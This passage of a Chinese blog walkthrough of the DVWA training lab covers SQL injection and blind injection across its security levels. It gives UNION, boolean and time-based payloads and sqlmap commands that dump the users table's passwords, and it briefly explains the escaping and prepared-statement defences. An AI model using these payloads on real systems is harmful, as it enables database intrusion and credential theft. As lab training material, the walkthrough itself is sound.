+          <a href="#查看列数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-1" class="headerlink" title="查看列数"></a>查看列数</h4>
+      <p>输入1 order by 1，从1一直试直到报错，即可获得字段数，直到3报错，所以列数为2</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211643275.png" alt="image-20240521164353245"></p>
+
+        <h4 id="获取当前数据库-2"   >
+          <a href="#获取当前数据库-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库-2" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,database();</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="获取数据库表名-1"   >
+          <a href="#获取数据库表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-1" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;;#</span><br></pre></td></tr></table></div></figure>
+
+<p>但是报错，再换一个方式</p>
+<p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221101651.png" alt="image-20240522110132595"></p>
+
+        <h4 id="查看表字段名-2"   >
+          <a href="#查看表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-2" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>
+
+<p>又报错，查看信息发现是’被转义成了&#39;，所以上一步也会报错</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211655692.png" alt="image-20240521165521659"></p>
+<p>可以转换成十六进制，user转换成十六进制为0x7573657273</p>
+<p>因此输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="查看字段内容-2"   >
+          <a href="#查看字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-2" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(user,password) from dvwa.users;#</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>查看关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211707114.png" alt="image-20240521170706087"></p>
+<p>使用<code>mysqli_real_escape_string</code> 函数，通过对字符串中的特定字符进行转义处理，在特定字符前添加反斜线 <code>\</code> ，特定字符包括’、”、\、NUL 字符、\n、\r、\x1A(在 Windows 系统中，Control-Z (<code>\x1A</code>) 被解释为文件结束标记)</p>
+
+        <h2 id="High-6"   >
+          <a href="#High-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-6" class="headerlink" title="High"></a>High</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211718721.png" alt="image-20240521171834684"></p>
+<p>点击是一个新窗口，可以在里面输入数据</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211719285.png" alt="image-20240521171902252"></p>
+<p>步骤和Low相同</p>
+<p>关键源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211721487.png" alt="image-20240521172121454"></p>
+<p>从 SESSION 获取 id 值，所以这里不能直接在当前页面注入，<code>LIMIT 1</code> 的作用是确保查询结果最多只返回一条记录</p>
+
+        <h2 id="Impossible-6"   >
+          <a href="#Impossible-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211732457.png" alt="image-20240521173224409"></p>
+<p>依然是用令牌来防止CSRF攻击，并且检测id是否为数字，使用 PDO 预处理语句来防止SQL注入攻击</p>
+
+        <h1 id="八、SQL注入（盲注）"   >
+          <a href="#八、SQL注入（盲注）" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、SQL注入（盲注）" class="headerlink" title="八、SQL注入（盲注）"></a>八、SQL注入（盲注）</h1>
+      
+        <h2 id="Low-7"   >
+          <a href="#Low-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908607.png" alt="image-20240522090817496"></p>
+<p>输入1，返回信息存在，但是没有显示出具体的信息，可以判断是盲注</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908944.png" alt="image-20240522090844910"></p>
+
+        <h3 id="布尔盲注"   >
+          <a href="#布尔盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3>
+      
+        <h4 id="判断注入类型-1"   >
+          <a href="#判断注入类型-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
+      <p>输入1’ or ‘1’ = ‘1，返回错误，所以是字符型的注入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220909854.png" alt="image-20240522090936814"></p>
+
+        <h4 id="查看列数-2"   >
+          <a href="#查看列数-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-2" class="headerlink" title="查看列数"></a>查看列数</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1;#</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br></pre></td></tr></table></div></figure>
+
+<p>依次尝试，发现输入到3时会报错，所以列数为2列</p>
+
+        <h4 id="获取数据库名"   >
+          <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
+      
+        <h5 id="获取数据库名称长度"   >
+          <a href="#获取数据库名称长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;20;#</span><br></pre></td></tr></table></div></figure>
+
+<p>返回不存在，说明数据库名称长度小于20</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220913553.png" alt="image-20240522091335512"></p>
+<p>按二分法思维一直判断数据库名称长度，最后可以获取到长度为4</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220915719.png" alt="image-20240522091518676"></p>
+
+        <h5 id="获取数据库名称"   >
+          <a href="#获取数据库名称" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;65;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1"   >
+          <a href="#substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#substr-database-1-1-表示从数据库名称中提取一个字符，1-1-表示提取位置为-1、长度为-1" class="headerlink" title="substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1"></a>substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1</h6>
+      
+        <h6 id="ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值"   >
+          <a href="#ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值" class="heading-link"><i class="fas fa-link"></i></a><a href="#ascii-substr-database-1-1-用于提取数据库名称的第一个字符并获取其-ASCII-值" class="headerlink" title="ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值"></a>ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值</h6>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220918767.png" alt="image-20240522091832725"></p>
+<p>所以第一个字符的ASCII码值大于65，再接着不断尝试，得到第一个字符的ASCII码值为100，即d，按此方法获取数据库第二个第三个第四个字符的ASCII码，最终得到数据库名称为dvwa</p>
+
+        <h4 id="获取数据库表名-2"   >
+          <a href="#获取数据库表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-2" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
+      
+        <h5 id="获取表的数量"   >
+          <a href="#获取表的数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database()) &lt;5;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="count-table-name-用于统计满足特定条件的行数（这里即表的数量）"   >
+          <a href="#count-table-name-用于统计满足特定条件的行数（这里即表的数量）" class="heading-link"><i class="fas fa-link"></i></a><a href="#count-table-name-用于统计满足特定条件的行数（这里即表的数量）" class="headerlink" title="count(table_name) 用于统计满足特定条件的行数（这里即表的数量）"></a>count(table_name) 用于统计满足特定条件的行数（这里即表的数量）</h6>
+      <p>返回存在，即表的数量少于5</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220929877.png" alt="image-20240522092952842"></p>
+<p>不断尝试获取到表的数量为2</p>
+
+        <h5 id="分别获取两个表的表名长度"   >
+          <a href="#分别获取两个表的表名长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) &gt; 10;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名"   >
+          <a href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-用于从信息模式中选择第一个表名" class="headerlink" title="(select table_name from information_schema.tables where table_schema=database() limit 0,1) 用于从信息模式中选择第一个表名"></a>(select table_name from information_schema.tables where table_schema=database() limit 0,1) 用于从信息模式中选择第一个表名</h6>
+      
+        <h6 id="limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…"   >
+          <a href="#limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…" class="heading-link"><i class="fas fa-link"></i></a><a href="#limit-0-1-用于限制只返回第一个结果；limit-1-1用于限制只返回第二个结果…" class="headerlink" title="limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果…."></a>limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果….</h6>
+      <p>返回查找失败，说明第一个表名长度小于10</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220932207.png"></p>
+<p>不断尝试获取到第一个表名长度为9，第二个表名长度为5</p>
+
+        <h5 id="分别获取两个表的表名"   >
+          <a href="#分别获取两个表的表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100;#</span><br></pre></td></tr></table></div></figure>
+
+<p> 返回存在，说明第一个表的第一个字符的ASCII码值大于100</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220939543.png" alt="image-20240522093910508"></p>
+<p>最终获得表名依次为guestbook，users</p>
+
+        <h4 id="获取字段名"   >
+          <a href="#获取字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4>
+      
+        <h5 id="获取users表中字段的数量"   >
+          <a href="#获取users表中字段的数量" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)&gt;10;#</span><br></pre></td></tr></table></div></figure>
+
+<p>返回不存在，说明字段数量小于10</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220953882.png" alt="image-20240522095302848"></p>
+<p>尝试后获得字段数量为8</p>
+
+        <h5 id="获取每个字段的字段长度"   >
+          <a href="#获取每个字段的字段长度" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))&gt;10;#</span><br></pre></td></tr></table></div></figure>
+
+<p>返回不存在，说明一个字段的字段长度小于10</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221001894.png" alt="image-20240522100158864"></p>
+<p>最终获得每个字段的字段长度为7，10，9，4，8，6，10，12</p>
+
+        <h5 id="获取字段名-1"   >
+          <a href="#获取字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))&gt;100;#</span><br></pre></td></tr></table></div></figure>
+
+<p>返回存在，所以第一个字段的ASCII码值大于100</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221010692.png" alt="image-20240522101036656"></p>
+<p>继续尝试，得到字段名分别为user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>
+
+        <h3 id="时间盲注"   >
+          <a href="#时间盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>
+      
+        <h4 id="判断注入类型-2"   >
+          <a href="#判断注入类型-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-2" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5);#</span><br></pre></td></tr></table></div></figure>
+
+<p>有明细的延迟</p>
+<p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and sleep(5);#</span><br></pre></td></tr></table></div></figure>
+
+<p>没有延迟，说明为字符型注入</p>
+
+        <h4 id="获取数据库名-1"   >
+          <a href="#获取数据库名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
+      
+        <h5 id="获取数据库名称长度-1"   >
+          <a href="#获取数据库名称长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度-1" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值"   >
+          <a href="#if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值" class="heading-link"><i class="fas fa-link"></i></a><a href="#if-expr1-expr2-expr3-函数：如果-expr1-是TRUE-，则-if-的返回值为expr2-，否则返回值则为-expr3。if-的返回值为数字值或字符串值" class="headerlink" title="if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值"></a>if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值</h6>
+      <p>页面没有延迟，说明数据库名长度不为1</p>
+<p>慢慢尝试，得到数据库名长度为4</p>
+
+        <h5 id="获取数据库名称-1"   >
+          <a href="#获取数据库名称-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称-1" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
+      <p>判断第一个字符，输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;90,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明数据库名第一个字符的ascii码值大于90</p>
+<p>慢慢尝试得到数据库名为dvwa</p>
+
+        <h4 id="获取数据库表名-3"   >
+          <a href="#获取数据库表名-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-3" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
+      
+        <h5 id="获取表的数量-1"   >
+          <a href="#获取表的数量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量-1" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明表的数量为2</p>
+
+        <h5 id="分别获取两个表的表名长度-1"   >
+          <a href="#分别获取两个表的表名长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度-1" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
+      <p>获取第一个表表名长度，输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明第一个表名长度为9</p>
+<p>同理获取到第二个表表名长度为5</p>
+
+        <h5 id="分别获取两个表的表名-1"   >
+          <a href="#分别获取两个表的表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名-1" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
+      <p>获取第一个表表名，输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明表名的第一个字符的ASCII码值大于100</p>
+<p>最后得到第一个表名为guestbook</p>
+<p>获取第二个表表名，输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明第二个表表名的第一个字符的ASCII码值为117，即u</p>
+<p>最后得到第二个表表名为users</p>
+
+        <h4 id="获取字段名-2"   >
+          <a href="#获取字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-2" class="headerlink" title="获取字段名"></a>获取字段名</h4>
+      
+        <h5 id="获取users表中字段的数量-1"   >
+          <a href="#获取users表中字段的数量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量-1" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明users表中的字段数量为8</p>
+
+        <h5 id="获取每个字段的字段长度-1"   >
+          <a href="#获取每个字段的字段长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度-1" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=7,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明第一个字段的长度为7</p>
+<p>最终获得每个字段的字段长度为7，10，9，4，8，6，10，12</p>
+
+        <h5 id="获取字段名-3"   >
+          <a href="#获取字段名-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-3" class="headerlink" title="获取字段名"></a>获取字段名</h5>
+      <p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=117,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>
+
+<p>页面有延迟，说明第一个字段的第一个字符的ASCII码值为117，即u</p>
+<p>继续尝试，得到字段名分别为user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>
+
+        <h3 id="Sqlmap-1"   >
+          <a href="#Sqlmap-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap-1" class="headerlink" title="Sqlmap"></a>Sqlmap</h3>
+      <p>使用sqlmap进行注入</p>
+
+        <h4 id="获得当前数据库名"   >
+          <a href="#获得当前数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得当前数据库名" class="headerlink" title="获得当前数据库名"></a>获得当前数据库名</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232157912.png" alt="image-20240523215729724"></p>
+
+        <h4 id="获得表名"   >
+          <a href="#获得表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得表名" class="headerlink" title="获得表名"></a>获得表名</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232208754.png" alt="image-20240523220802688"></p>
+
+        <h4 id="获得表的字段名"   >
+          <a href="#获得表的字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得表的字段名" class="headerlink" title="获得表的字段名"></a>获得表的字段名</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232207992.png" alt="image-20240523220744925"></p>
+
+        <h4 id="获取字段具体数据"   >
+          <a href="#获取字段具体数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段具体数据" class="headerlink" title="获取字段具体数据"></a>获取字段具体数据</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241319693.png" alt="image-20240524131957645"></p>
+<p>查看源代码，对输入没有任何限制</p>
+
+        <h2 id="Medium-7"   >
+          <a href="#Medium-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221337952.png" alt="image-20240522133710909"></p>
+<p>和之前的注入一样，用HackBar用POST方式传入</p>
+
+        <h3 id="布尔盲注-1"   >
+          <a href="#布尔盲注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3>
+      
+        <h4 id="判断注入类型-3"   >
+          <a href="#判断注入类型-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-3" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
+      <p>输入1，页面返回存在这个ID</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320595.png" alt="image-20240522132028528"></p>
+<p>输入1’or ‘1’=’1，报错</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320302.png" alt="image-20240522132059254"></p>
+<p>输入1 or 1 = 1，返回存在ID，说明是数字型注入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221321139.png" alt="image-20240522132120100"></p>
+
+        <h4 id="查看列数-3"   >
+          <a href="#查看列数-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-3" class="headerlink" title="查看列数"></a>查看列数</h4>
+      <p>输入1 order by 1，从1一直试直到报错，即可获得字段数，直到3报错，所以列数为2</p>
+
+        <h4 id="获取数据库名-2"   >
+          <a href="#获取数据库名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
+      
+        <h5 id="获取数据库名称长度-2"   >
+          <a href="#获取数据库名称长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度-2" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
+      <p>输入</p>
